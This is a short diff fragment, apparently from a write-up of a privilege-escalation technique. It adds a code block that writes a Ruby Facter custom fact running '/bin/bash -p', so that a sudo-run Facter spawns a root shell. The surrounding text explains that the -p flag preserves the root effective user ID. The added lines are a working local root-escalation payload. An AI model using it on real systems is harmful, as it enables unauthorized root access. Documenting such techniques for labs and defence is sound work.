@@ -1181,7 +1181,11 @@ Here's a Ruby script designed to spawn an interactive bash shell with administra
 By using the `-p` flag with `/bin/bash`, it ensures that the shell would maintain the effective user ID (root) provided by the `sudo` command.
 
 
-
+```rb
+echo 'Facter.add(:nyorosha) do
+  setcode { exec("/bin/bash -p") }
+end' > /home/trivia/nyorosha.rb
+```
 <div align="center">
 <br>
 <br>
